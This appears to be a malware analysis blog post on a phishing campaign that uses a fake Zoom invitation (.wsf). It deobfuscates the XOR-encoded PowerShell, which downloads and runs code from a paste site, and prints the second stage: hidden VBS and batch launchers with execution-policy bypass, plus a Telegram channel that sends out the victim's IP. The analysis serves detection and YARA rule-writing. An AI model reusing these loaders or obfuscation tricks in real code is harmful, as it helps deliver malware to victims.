# Introduction


Phishing campaigns are among the most common tactics employed by cybercriminals to distribute malware, capitalising on trust and human error to infiltrate systems. A simple example of this is the **Zoom_Invite.call.wsf** attack, which utilises fake Zoom meeting invitations to lure unsuspecting users into downloading malicious files. This post embarks on an exploration of the techniques employed in this campaign, revealing how attackers leverage social engineering and sophisticated obfuscation methods to evade security measures.

In our detailed analysis of the **Zoom_Invite.call** file, the initial scan of this file shows 3/63 detection rate virus scan on VirusTotal as shown in Fig 1. We uncover its connection to hxxps://paste.ee/r/2FDzd/, from which a dangerous powershell payload is downloaded. Our investigation includes static analysis that reveals hidden variables like **$cake and $oven**, leading us to discover a Telegram Command and Control (C2) configuration embedded in the malware. Furthermore, we perform dynamic analysis using VirusTotal to extract critical Indicators of Compromise (IoCs). Ultimately, we develop a YARA rule designed to detect this malicious activity in the future.

## Phishing Analysis

In this next phase, we will examine the **Zoom_Invite.call** file, which has a **.wsf** extension as shown in Fig 2. Our goal is to spend some time analysing the file to understand its functionality and behaviour.

The scripts appear suspicious due to their content. The note highlights that the Social Security Administration (SSA) may raise concerns regarding integrity. Nevertheless, we will focus on the analysis in the next phase, particularly examining the code illustrated in Fig 3.

## Reverse this VBScript snippet


To reverse the process, a Python script is required to extract the array of numbers in the `[char[]]` block. Each number will be **XORed** with `0x1a` to retrieve the original ASCII value. The resulting ASCII values will then be converted back into characters. Finally, these characters will be joined together to form the final PowerShell command.

Many researchers can decide to use different methods to reverse the `[char[]]` value to understand what the code is meant to do. However, we will use Python for this task. In this case, we do not know what we will find from the `[char[]]` value, but let's see.


```python

# Let passs the original obfuscated char array in "char_array"
char_array = [62, 72, 39, 61, 83, 127, 66, 50, 84, 127, 61, 33, 62, 72, 95, 58, 39, 58, 62, 72, 49, 61, 77, 55, 85, 88, 80, 61, 33, 62, 72, 95, 94, 58, 39, 58, 62, 72, 95, 49, 61, 127, 89, 78, 58, 84, 127, 78, 52, 77, 61, 33, 62, 74, 91, 89, 39, 61, 127, 88, 89, 86, 61, 33, 62, 98, 98, 58, 39, 58, 62, 74, 91, 89, 49, 61, 83, 127, 84, 61, 33, 62, 72, 85, 58, 39, 58, 62, 98, 98, 49, 61, 78, 51, 52, 94, 85, 77, 84, 86, 85, 61, 33, 62, 96, 96, 39, 61, 85, 90, 42, 50, 60, 50, 61, 61, 114, 110, 110, 106, 105, 32, 53, 53, 106, 123, 105, 110, 127, 52, 127, 127, 53, 104, 53, 40, 92, 94, 96, 126, 53, 42, 61, 61, 51, 61, 52, 72, 127, 74, 86, 91, 89, 127, 50, 61, 85, 90, 42, 50, 60, 61, 54, 61, 91, 94, 73, 78, 72, 83, 84, 93, 61, 51, 33, 115, 127, 98, 50, 62, 72, 95, 94, 49, 62, 72, 85, 49, 62, 96, 96, 51]

# Beecuase we know that the XOR operation with 0x1a so we use that to decode the chars.
decoded_chars = [chr(c ^ 0x1a) for c in char_array]

# We then join the characters to form the string together
decoded_command = ''.join(decoded_chars)

# Hopefully if the code work, we then specify the output file
output_file = "deobfuscated_powershell_command_1.txt"

# Write the deobfuscated command to the file
with open(output_file, "w") as file:
    file.write(decoded_command)

print(f"Deobfuscated PowerShell command saved to {output_file}")
```


In the above code, We will decode a PowerShell command that has been obfuscated using an XOR operation with the value **`0x1a`** as discovered in the main source code. 

First, the line **`decoded_chars = [chr(c ^ 0x1a) for c in char_array]`** processes an array of numerical values called **`char_array`**, which contains the original obfuscated character values. For each number **`c`** in this array, the code applies the XOR operation with **`0x1a`** (which is 26 in decimal). The result of this operation is then converted to a character using the **`chr()`** function, and these characters are stored in the list **`decoded_chars`**.

Next, the line **`decoded_command = ''.join(decoded_chars)`** concatenates all the characters in the **`decoded_chars`** list into a single string. This string represents the decoded PowerShell command.

The variable **`output_file`** is set to **`"deobfuscated_powershell_command_1.txt"`**, specifying the name of the file where the decoded command will be saved because we do not known how long the results will be.


## Results 


We get some intresting results from the python code like this;

```powershell

$R='IeX(Ne';$RE = $R+'W-OBJ';$RED = $RE+'eCT NeT.W';$PAC='eBCL';$xx = $PAC+'IeN';$RO = $xx+'T).DOWNLO';$zz='O@0(&(''hxxps://paste.ee/r/2FDzd/0'')'.RePLACe('O@0(&','ADSTRING');iex($RED+$RO+$zz)

```


This PowerShell code snippet constructs and executes a command to download and run a script from a specified URL which is **hxxps://paste.ee/r/2FDzd/0**.

First, the variable **`$R`** is assigned the string **`IeX(Ne`**. Then, the string **`W-OBJ`** is concatenated to **`$R`**, resulting in the variable **`$RE`** being equal to **`IeX(NeW-OBJ`**. Next, the string **`eCT NeT.W`** is appended to **`$RE`**, making the variable **`$RED`** equal to **`IeX(NeW-OBJeCT NeT.W`**.

The variable **`$PAC`** is assigned the string **`eBCL`**, and the string **`IeN`** is concatenated to **`$PAC`**, resulting in **`$xx`** being **`eBCIeN`**. Subsequently, **`T).DOWNLO`** is appended to **`$xx`**, making the variable **`$RO`** equal to **`eBCIeNT).DOWNLO`**.

The variable **`$zz`** is assigned a string that appears to contain a URL. The expression **`$zz.RePLACe('O@0(&','ADSTRING')`** replaces the substring **`O@0(&`** in **`$zz`** with **`ADSTRING`**, transforming it into **`ADSTRING''hxxps://paste.ee/r/2FDzd/0''**.

Finally, the command **`iex($RED+$RO+$zz)`** combines the three constructed strings (**`$RED`**, **`$RO`**, and **`$zz`**) and executes the resulting command using the **`iex`** (Invoke-Expression) cmdlet. This effectively runs the PowerShell command constructed from the concatenated strings as shown in Fig 4. Nevertheless, We will reconstruct the PowerShell code for better readability.


![URL Download](/assets/images/zoom/URL_download.png)
*Figure 4: URL Download Process*



## Recontructing the powershell

```python

# Define parts of the PowerShell command
R = 'IeX(Ne'
RE = R + 'W-OBJ'
RED = RE + 'eCT NeT.W'
PAC = 'eBCL'
xx = PAC + 'IeN'
RO = xx + 'T).DOWNLO'

# Correcting the definition of zz by using double quotes for the URL
zz = "O@0(&('https://paste.ee/r/2FDzd/0')"
zz = zz.replace('O@0(&', 'ADSTRING')

# Combine all parts to form the complete PowerShell command
powershell_command = f"{RED}{RO}{zz}"

# Specify the output file
output_file = "deobfuscated_powershell_command_2.txt"

# Write the deobfuscated command to the file
with open(output_file, "w") as file:
    file.write(powershell_command)

print(f"Deobfuscated PowerShell command saved to {output_file}")
print("PowerShell Command:", powershell_command)
```


This code will output the deobfuscated PowerShell for better readability and now we have;

```powershell
IeX(NeW-OBJeCT NeT.WeBCLIeNT).DOWNLOADSTRING('hxxps://paste.ee/r/2FDzd/0')

```


This is the deobfuscated PowerShell command. It downloads a script from the specified URL and executes it. As of **5/10/2024**, the URL returns a 404 error, indicating that the adversary has removed the malicious file hosted on the paste.ee domain, which could have provided further insights for our analysis. Overall, this code snippet builds a PowerShell command that ultimately downloads and executes a script from the URL **`hxxps://paste.ee/r/2FDzd/0`**. The use of concatenation and string manipulation obscures the script's intentions, making it harder to detect sometimes. The final execution line (**`iex(...)`**) is particularly concerning, as it invokes potentially malicious code from the internet, which can be the main payload.


## Threat Intelligence

By leveraging threat intelligence, we can uncover valuable resources and additional information about the file. We checked the file using the MD5 hash **e4895b941c8ea6d76630d6fcb2002292** on Filescan [here](https://www.filescan.io/uploads/66f3ae64c48f81cd6a0cd525/reports/ff23aa67-cdd6-4d34-a766-7b1307cb7ee0/overview) to determine if we could download the main payload, which was available at the time of this analysis as shown in Fig 5.

After downloading the file, the next step is to begin the analysis anew, this time focusing on the actual malware or file that the WSF is designed to deliver to the victim's system, which is PowerShell as shown in Fig 6.

```


We can say that;

This PowerShell script performs several tasks involving string manipulation, file creation, and execution of batch scripts. Below is a breakdown of the main components:

1. **Variable Initialization**:
```powershell
   sET-iTem vaRiaBlE:a6p ( [type]("{2}{1}{0}" -f 'E','.Fil','IO') )
```


This line sets a variable **'a6p'** to the type **[System.IO.File]**, using a formatted string to construct the type name.


2. **Creating a Directory**

```powershell
${D} = ((("{2}{5}{4}{3}{0}{6}{1}" -f 'Datap','ualsp8P','C','ram','g',':p8PPro','8PMusicp8PVis'))-rEplAcE([CHar]112+[CHar]56+[CHar]80),[CHar]92)
```

This line constructs a path for a directory named **C:\ProgramData\Music\Visuals** by formatting and replacing specific character codes.

```powershell
&("{0}{1}"-f'New-','Item') -ItemType ("{2}{1}{0}" -f 'y','ctor','Dire') -Path ${d} -Force | &("{2}{1}{0}" -f'l','ul','Out-N')
```
Here, the script creates the directory defined in **${D}** if it doesn't already exist.


3. **Sleep Command**

```powershell
.("{0}{1}" -f'slee','p') -Seconds 5
```


4. **VBScript Content Creation**
```powershell
${co`NT`ENt} = @'
On Error Resume Next

Sub zjte
    Dim sbyjn
    Set sbyjn = CreateObject("WScript.Shell")
    sbyjn.Run "C:\ProgramData\Music\Visuals\VsEnhance.bat", 0, True
End Sub
zjte
'@
```

This block defines a VBScript subroutine that executes a batch file located at ***C:\ProgramData\Music\Visuals\VsEnhance.bat*** without displaying a window.




5. **Writing VBScript to File**

```powershell

(geT-vARiaBlE ('a'+'6P')).vAluE::("{1}{0}{3}{2}" -f'rite','W','llText','A').Invoke("$d\VsLabs.vbs" , ${CO`N`TEnT})
```
This writes the defined VBScript content to a file named VsLabs.vbs in the directory ${d}.

6. **Creating a Batch File**

```powershell

try {
    ${CO`Nt`eNT} = @'
    @echo off                              
    cmd /c Powershell -noP -W hidden -ep byPass -NONI "C:\ProgramData\Music\Visuals\VsLabsData.ps1"         
    '@
} catch {}
```

This try-catch block attempts to define another batch file's content, which runs a PowerShell script hidden and with bypassed execution policies.

7. **Writing Batch File**

```powershell

( Get-VariaBlE  A6p).VAluE::("{0}{2}{1}" -f'W','iteAllText','r').Invoke("$d\VsEnhance.bat" , ${CON`TE`Nt})


```

This writes the content for VsEnhance.bat to the same directory, which will execute the **VsLabsData.ps1** script.

Having explored the fundamental aspects of the code and its intentions, it is clear that this script is designed to create a specific directory, generate two script files (a VBScript and a batch file), and execute a PowerShell script without the user's visibility. The script employs string manipulation and obfuscation techniques, likely to evade detection during malware analysis. The next step involves reversing the long encoded characters in the variable **`$cake`** and **'$oven'** as shown in Fig 6.

#### Telegram C2

The examined PowerShell script also demonstrates malicious behaviour primarily aimed at exfiltrating the victim's public IP address and notifying a remote attacker via Telegram. 

Initially, the script attempts to retrieve the public IP address by calling the function `Get-PublicIPAddress`. If no public IP address is returned, the script outputs a message indicating this absence. However, if a public IP address is successfully retrieved, it constructs a message intended for the attacker's Telegram channel, announcing that the victim's system has been compromised. In addition, the VirusTotal scan identified this Telegram interaction, which was flagged by the IDS, as shown in Fig 7.


![Telegram API](/assets/images/zoom/telegram_api.png)
*Figure 7: Telegram API Interaction*

A significant aspect of this malware is the hard-coded Telegram Bot Token and Chat ID, which are used to send messages directly to the attacker. The script defines a function, `Send-TelegramMessage`, that constructs an API request to Telegram's messaging service. This function takes the bot token, chat ID, and message as parameters. If the API call succeeds, it sends a notification to the specified chat channel; if it fails, an error message is logged. This behaviour indicates that the malware not only seeks to gather information about the infected machine but also establishes a direct communication channel with the attacker.


### Reversinng the value in `$cake` and `$oven`


After numerous trials and errors, many researchers utilise various tools to reverse-engineer or decode strings. It is essential to stick to what is easy or comfortable for you. Nevertheless, as usual, Python will be employed for this task, considering that we already understand the logic the malware author used in the obfuscation.

#### My logics

```python

import re

# Original PowerShell script as a string
powershell_script = r"""

follow by the source code of the powershell here, include the
    $cake = 
    $oven = 

then we go ahead and declare our own functions;

"""
# Function to clean up and format the PowerShell script
def clean_script(script):
    # Remove excessive whitespace and comments
    script = re.sub(r'\s+', ' ', script)  # Replace multiple spaces/newlines with a single space
    script = re.sub(r'\s*#.*?$', '', script, flags=re.MULTILINE)  # Remove comments
    script = re.sub(r'[^\x20-\x7E]+', '', script)  # Keep only printable ASCII characters
    return script.strip()

# Function to save cleaned script to a file
def save_to_file(filename, content):
    with open(filename, 'w') as f:
        f.write(content)

# Clean and save the PowerShell script
cleaned_script = clean_script(powershell_script)
save_to_file('cleaned_script.ps1', cleaned_script)

# Function to extract and save strings found in the script (e.g., batch file content)
def extract_strings(script):
    # Find all string literals in the script
    strings = re.findall(r'@"(.*?)"@', script, re.DOTALL)
    return strings

# Extract strings and save them
extracted_strings = extract_strings(powershell_script)
with open('extracted_strings.txt', 'w') as f:
    for string in extracted_strings:
        f.write(f"{string.strip()}\n")

print("Cleaning and extraction completed,thank you.")


```
In this phase, the code will not be explained in detail to optimise time, as it contains sufficient comments and is self-explanatory.


#### Analysis of PowerShell Script Obfuscation

The provided PowerShell script demonstrates various obfuscation techniques to conceal its true purpose. Below is a breakdown of the script, focusing on the structure, variable usage, and the potential functionalities hidden within the obfuscation as discovered and shown Fig 8.

![Second Payload Deobfuscated](/assets/images/zoom/second_payload_deobsf.png)
*Figure 8: Second Payload Deobfuscated*

#### Key Components

1. **Variable Assignment and Obfuscation**:
   - The script begins by assigning the value `a6p` to a variable using the `sET-iTem` command, which is an unusual way to define a variable. 
   - The variables are obfuscated using string formatting and replacement techniques. For example:
     ```powershell
     ${D} = ((("{2}{5}{4}{3}{0}{6}{1}" -f 'Datap','ualsp8P','C','ram','g',':p8PPro','8PMusicp8PVis'))-rEplAcE([CHar]112+[CHar]56+[CHar]80),[CHar]92)
     ```
   - Here, the variable `${D}` is constructed using formatted strings, making it difficult to immediately identify its purpose.

2. **Functionality Execution**:
   - The script attempts to create a new directory using the constructed path stored in variable `${d}`:
     ```powershell
     &("{0}{1}"-f'New-','Item') -ItemType ("{2}{1}{0}" -f 'y','ctor','Dire') -Path ${d} -Force
     ```
   - The usage of string formatting in the command further obfuscates its function.

3. **Script Content and Execution**:
   - The script defines a block of VBScript content stored in variable `${co`NT`ENt}`:
     ```powershell
     ${co`NT`ENt} = @'
     On Error Resume Next
     Sub zjte
         Dim sbyjn
         Set sbyjn = CreateObject("WScript.Shell")
         sbyjn.Run "C:\ProgramData\Music\Visuals\VsEnhance.bat", 0, True
     End Sub
     zjte
     '@
     ```
   - This VBScript is designed to execute a batch file silently, indicating a potential malicious intent.

4. **Batch File Creation**:
   - The script also creates a batch file that runs a PowerShell script hidden from the user:
     ```powershell
     ${CO`Nt`eNT} = @'
     @echo off
     cmd /c Powershell -noP -W hidden -ep byPass -NONI "C:\ProgramData\Music\Visuals\VsLabsData.ps1"
     '@
     ```


#### Conclusion

The script appears to focus on creating a directory, writing a VBScript, and executing a PowerShell script in a hidden manner. The presence of the hex values in variables `${cake}` and `${oven}` suggests the intent to handle executable content, which further underscores the potential for malicious use. The script's design to evade detection during analysis, highlighting the importance of thorough examination and deobfuscation in malware investigation.



## Dynamics Analysis with VirusTotal

Let's see if something related to this discovery can be found using the same MD5 hash **2e63fec5163d85af2caf87e31459a0d6cca4cdb3d65a797e00a62b0c2b76acd7** on VirusTotal as shown in Fig 9.

![VirusTotal Scan Results](/assets/images/zoom/VirusTotal_scan_results.png)
*Figure 9: VirusTotal Scan Results*

#### Description

The code snippet is a VBScript embedded in a package structure, identified as a job script with the ID **'manage-tujthyqgfu.exe'**. It uses the `CreateObject` method to interact with the `WScript.Shell` object as show in Fig 10. 

![Tree](/assets/images/zoom/tree.png)
*Figure 10: Overall Malware Tree Structure*


Which is then executed via the `Run` method of `WScript.Shell`. The command is obfuscated using a XOR operation with the hexadecimal value '0x1a', making analysis and detection more difficult. Please check the scan results [here](https://www.virustotal.com/gui/file/2e63fec5163d85af2caf87e31459a0d6cca4cdb3d65a797e00a62b0c2b76acd7/detection) if interested.

Some commands were executed after downloading the malware as show in Fig 11; note that dynamic analysis won't be deeply explored to optimise time. The goal is to correlate the results with the static analysis already conducted. A link to a full report is provided for further details.

The executed commands reveal various activities performed by the malware after file execution. A significant portion of the commands involve the use of PowerShell, specifically with obfuscated commands that utilize `Invoke-Expression` to execute encoded scripts. Additionally, numerous DNS and IP addresses were contacted, as illustrated in Figure 13.


![Telegram API](/assets/images/zoom/ip_observed.png)
*Figure 13: Observed IPs*

Key observations include:

1. **Obfuscated PowerShell Commands**: Multiple commands employ complex character manipulations and XOR operations to obfuscate the payload, making detection more challenging.

#### Yara Testing Locally
We have successfully created a YARA rule to detect such activities as shown in Fig 14.

![Telegram API](/assets/images/zoom/yara_testing.png)
*Figure 14: Testing Yara locally*


#### Deploying the Yara

The Yara file was also deployed on Yaraify. Initially, we encountered a significant number of false positives, especially with certain pattern matches. One of the team members reached out via email to fine-tune the detection. After making the necessary adjustments, the YARA rule now shows a much-improved detection rate, as illustrated in Figure 15.

## Conclusion

In this analysis, we examined the Zoom_Invite.call file, which is a .wsf script. Our static analysis revealed that it connects to **hxxps://paste.ee/r/2FDzd/**, from which a malicious file is downloaded. We further explored the static characteristics of the malware and successfully deobfuscated the long encoded strings stored in the variables $cake and $oven. This process led us to identify the Telegram Command and Control (C2) configuration embedded within the malware.

Subsequently, we performed dynamic analysis using VirusTotal, allowing us to extract Indicators of Compromise (IoCs). Finally, we created a YARA rule to facilitate the detection of this malware in future analyses.
